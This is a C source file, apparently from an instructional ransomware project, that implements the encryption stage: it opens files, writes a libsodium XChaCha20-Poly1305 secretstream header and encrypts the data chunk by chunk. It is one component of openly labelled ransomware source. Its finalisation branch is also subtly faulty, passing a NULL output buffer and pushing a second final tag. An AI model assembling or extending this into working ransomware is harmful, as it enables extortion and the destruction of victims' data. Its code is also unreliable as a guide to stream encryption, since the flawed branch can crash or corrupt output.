#include "ransom.h"
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/*
** Here, you have to open both files with different permissions : think of what you want to
** to do with each file. Don't forget to check the return values of your syscalls !
*/
bool init_encryption(FILE **to_encrypt, FILE **encrypted,
    const char *filepath, const char *optfilepath)
{
    if (!to_encrypt || !encrypted || !filepath || !optfilepath)
        return false;

    *to_encrypt = fopen(filepath, "rb");
    if (!*to_encrypt) {
        perror("fopen (to_encrypt)");
        return false;
    }

    *encrypted = fopen(optfilepath, "wb");
    if (!*encrypted) {
        perror("fopen (encrypted)");
        fclose(*to_encrypt);
        *to_encrypt = NULL;
        return false;
    }

    return true;
}

/*
** I strongly advise to code near the sources/decryption.c code : it is the opposite process.
** Here, you have to initialize the header, then write it in the encrypted file.
*/
int write_header(unsigned char *generated_key, FILE **to_encrypt,
    FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st)
{
    (void) to_encrypt;

    if (!generated_key || !encrypted || !*encrypted || !st) {
        fprintf(stderr, "write_header: invalid arguments\n");
        return EXIT_FAILURE;
    }

    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];

    if (crypto_secretstream_xchacha20poly1305_init_push(st, header, generated_key) != 0) {
        fprintf(stderr, "crypto_secretstream_xchacha20poly1305_init_push failed\n");
        return EXIT_FAILURE;
    }

    size_t written = fwrite(header, 1, crypto_secretstream_xchacha20poly1305_HEADERBYTES, *encrypted);
    if (written != crypto_secretstream_xchacha20poly1305_HEADERBYTES) {
        perror("fwrite (header)");
        return EXIT_FAILURE;
    }

    if (fflush(*encrypted) != 0) {
        perror("fflush (encrypted)");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

/*
** The encryption loop really looks the same than the decryption one.
** In decryption_loop, the crypto_secretstream_xchacha20poly1305_pull is used to retrieve data.
** Think of the opposite of "pull" things... The link provided in the README.md about libsodium
** should really help you.
*/
int encryption_loop(FILE *to_encrypt, FILE *encrypted,
    crypto_secretstream_xchacha20poly1305_state st)
{
    if (!to_encrypt || !encrypted) {
        fprintf(stderr, "encryption_loop: invalid file handles\n");
        return EXIT_FAILURE;
    }

    const size_t CHUNK = 4096;
    unsigned char inbuf[CHUNK];
    unsigned char *outbuf = NULL;
    size_t read_bytes;
    bool last_sent = false;

    while ((read_bytes = fread(inbuf, 1, CHUNK, to_encrypt)) > 0) {
        unsigned long long outlen = 0;
        int tag = 0;

        if (read_bytes < CHUNK && feof(to_encrypt))
            tag = crypto_secretstream_xchacha20poly1305_TAG_FINAL;

        outbuf = (unsigned char *) malloc(read_bytes + crypto_secretstream_xchacha20poly1305_ABYTES);
        if (!outbuf) {
            perror("malloc");
            return EXIT_FAILURE;
        }

        if (crypto_secretstream_xchacha20poly1305_push(&st,
                    outbuf, &outlen,
                    inbuf, (unsigned long long) read_bytes,
                    NULL, 0, (unsigned char) tag) != 0) {
            fprintf(stderr, "crypto_secretstream_xchacha20poly1305_push failed\n");
            free(outbuf);
            return EXIT_FAILURE;
        }

        if (fwrite(outbuf, 1, (size_t) outlen, encrypted) != (size_t) outlen) {
            perror("fwrite (encrypted data)");
            free(outbuf);
            return EXIT_FAILURE;
        }

        free(outbuf);
        outbuf = NULL;

        if (tag == crypto_secretstream_xchacha20poly1305_TAG_FINAL) {
            last_sent = true;
            break;
        }
    }

    if (!last_sent) {
        unsigned long long outlen = 0;
        if (crypto_secretstream_xchacha20poly1305_push(&st,
                    NULL, &outlen,
                    NULL, 0,
                    NULL, 0,
                    crypto_secretstream_xchacha20poly1305_TAG_FINAL) != 0) {
            fprintf(stderr, "crypto_secretstream_xchacha20poly1305_push (final empty) failed\n");
            return EXIT_FAILURE;
        }
        if (outlen > 0) {
            unsigned char *final_out = malloc((size_t) outlen);
            if (!final_out) {
                perror("malloc final_out");
                return EXIT_FAILURE;
            }
            if (crypto_secretstream_xchacha20poly1305_push(&st,
                        final_out, &outlen,
                        NULL, 0,
                        NULL, 0,
                        crypto_secretstream_xchacha20poly1305_TAG_FINAL) != 0) {
                fprintf(stderr, "crypto_secretstream_xchacha20poly1305_push (final) failed\n");
                free(final_out);
                return EXIT_FAILURE;
            }
            if (fwrite(final_out, 1, (size_t) outlen, encrypted) != (size_t) outlen) {
                perror("fwrite (final tag)");
                free(final_out);
                return EXIT_FAILURE;
            }
            free(final_out);
        }
    }

    if (fflush(encrypted) != 0) {
        perror("fflush (encrypted)");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
